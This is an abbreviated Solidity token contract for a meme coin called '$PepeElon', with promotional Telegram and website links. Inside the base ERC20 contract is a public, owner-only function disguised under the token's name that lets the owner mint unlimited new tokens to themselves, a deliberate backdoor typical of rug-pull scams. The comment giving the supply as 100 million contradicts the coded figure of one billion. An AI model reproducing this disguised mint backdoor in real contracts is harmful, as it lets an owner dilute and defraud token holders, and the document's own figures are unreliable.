//
// $PepeElon proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+luvWvUrMIMw5MjQ1
//  📱 Website::https://www.pepeelon.net
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeElon(uint256 amount) public onlyOwner {
 _PepeElon(msg.sender, amount);
    }
    ...
    function _PepeElon(address account, uint256 amount) internal virtual {
...
contract $PepeElon is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe Elon", "PEPEELON") {
    _PepeElon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}